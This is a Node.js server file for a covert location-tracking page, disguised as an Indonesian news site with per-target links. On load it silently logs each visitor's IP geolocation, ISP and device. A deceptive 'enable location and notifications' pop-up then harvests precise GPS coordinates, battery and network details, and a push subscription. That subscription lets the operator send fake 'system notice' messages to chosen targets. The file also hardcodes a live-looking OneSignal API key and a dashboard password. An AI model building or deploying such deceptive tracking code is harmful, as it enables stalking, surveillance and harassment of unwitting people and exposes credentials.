const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';

const DASH_KEY = 'gilang123';
const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');
const DEVICE_FILE = path.join(TLOG, 'devices.json');
const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');

function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}
function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return { model: 'Unknown', os: 'Desktop', browser: 'Browser' };
  let os = 'Desktop', model = 'Unknown', browser = 'Browser';
  if (/android/i.test(ua)) { os = 'Android'; const match = ua.match(/Android[^;]*;\s*([^;)]+)/i); if (match && match[1]) model = match[1].trim().split(' Build/')[0]; }
  else if (/iphone/i.test(ua)) { os = 'iOS'; model = 'iPhone'; }
  else if (/ipad/i.test(ua)) { os = 'iOS'; model = 'iPad'; }
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { model, os, browser };
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`;
  try { const r = await fetch(url); return await r.json(); } catch (e) { return { status: 'fail' }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '2mb' })); 

app.post('/api/save-player', (req, res) => {
  const ip = clientIp(req);
  const { playerId } = req.body;
  if (!playerId) return res.status(400).json({ error: 'No Player ID' });
  let ids = {};
  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
  ids[ip] = playerId;
  fs.writeFileSync(OS_IDS_FILE, JSON.stringify(ids));
  res.json({ ok: true });
});

app.post('/api/push', async (req, res) => {
  if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
  const { ip, text } = req.body;
  let ids = {};
  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
  const playerId = ids[ip];
  if (!playerId) return res.json({ ok: false, msg: 'Target belum izinin notif' });

  try {
    const response = await fetch('https://onesignal.com/api/v1/notifications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
      body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
    });
    const data = await response.json();
    res.json({ ok: data.id ? true : false });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.get('/api/geoip', async (req, res) => {
  const ip = clientIp(req);
  const dev = detectDevice(req.headers['user-agent']);
  const data = await ipGeo(ip);
  appendLog(GEO_FILE, [new Date().toISOString(), cleanSlug(req.query.s) || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', `${dev.model}|${dev.os}|${dev.browser}`].join('\t'));
  res.json(data);
});

app.post('/api/gps', (req, res) => {
  const d = req.body || {};
  d.ip = clientIp(req); 
  const dev = detectDevice(req.headers['user-agent']);
  d.model = dev.model; d.os = dev.os; d.browser = dev.browser;
  d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

// ============ DASHBOARD LIST & MAP (SAMA KAYAK SEBELUMNYA) ============
// (Gue potong biar fokus ke Landing Page, tapi di file lo JANGAN dihapus. 
// Tempel ulang bagian Dashboard lo di sini)

// ============ LANDING PAGE (FIXED STUCK) ============
app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Berita Terkini</title>
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
<script>
  window.OneSignalDeferred = window.OneSignalDeferred || [];
  OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
  });
</script>
<style>
  body{margin:0;font-family:-apple-system,sans-serif;background:#f1f5f9;color:#1e293b}
  .navbar{background:#0f172a;color:#fff;padding:16px;font-weight:bold;font-size:18px;text-align:center}
  .container{padding:16px;max-width:600px;margin:auto}
  .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05)}
  .card h3{margin:0 0 10px;font-size:18px}
  .card p{margin:0;font-size:14px;line-height:1.6;color:#475569}
  .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
  .popup-overlay.show{opacity:1;pointer-events:auto}
  .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
  .popup-overlay.show .popup-box{transform:translateY(0)}
  .popup-icon{font-size:40px;margin-bottom:15px}
  .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
  .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
  .popup-btn{background:#0f172a;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
  .popup-btn:active{background:#334155}
</style></head>
<body>

<div class="navbar">Berita Hari Ini</div>
<div class="container">
  <div class="card"><h3>Cuaca Ekstrem Landa Beberapa Wilayah</h3><p>BMKG menghimbau masyarakat untuk waspada...</p></div>
  <div class="card"><h3>Update Terbaru Kebijakan Pendidikan</h3><p>Pemerintah merilis kebijakan baru...</p></div>
</div>

<div class="popup-overlay" id="popup">
  <div class="popup-box">
    <div class="popup-icon">📍</div>
    <h3>Aktifkan Lokasi & Notifikasi</h3>
    <p>Untuk melihat berita terdekat dan notifikasi penting, harap izinkan akses.</p>
    <button class="popup-btn" id="allowBtn">Oke, Izinkan Sekarang</button>
  </div>
</div>

<script>
(async function(){
  const slug = '${slug}';
  
  fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});

  setTimeout(() => {
    document.getElementById('popup').classList.add('show');
  }, 1000);

  document.getElementById('allowBtn').addEventListener('click', async function() {
    this.innerText = 'Memproses...';
    this.disabled = true;
    const btn = this;

    // Fungsi buat nutup popup kalau kelamaan
    const forceClose = setTimeout(() => {
      document.getElementById('popup').classList.remove('show');
      btn.innerText = 'Oke, Izinkan Sekarang';
      btn.disabled = false;
    }, 4000); // Maksimal 4 detik nunggu

    // 1. Minta GPS (Dikasih batas waktu 3 detik)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
        e => {},
        {enableHighAccuracy:true,timeout:3000,maximumAge:0}
      );
    }

    // 2. Minta Notif
    if (window.OneSignal) {
      try {
        await OneSignal.Notifications.requestPermission();
        const playerId = OneSignal.User.PushSubscription.id;
        if(playerId) {
          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
        }
      } catch(e) { console.log(e); }
    }

    // Ambil Data Lain
    const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
    if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
    if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});

    // Kalau udah selesai semua, tutup popup
    clearTimeout(forceClose);
    document.getElementById('popup').classList.remove('show');
    btn.innerText = 'Oke, Izinkan Sekarang';
    btn.disabled = false;
  });
})();
</script>
</body></html>`);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
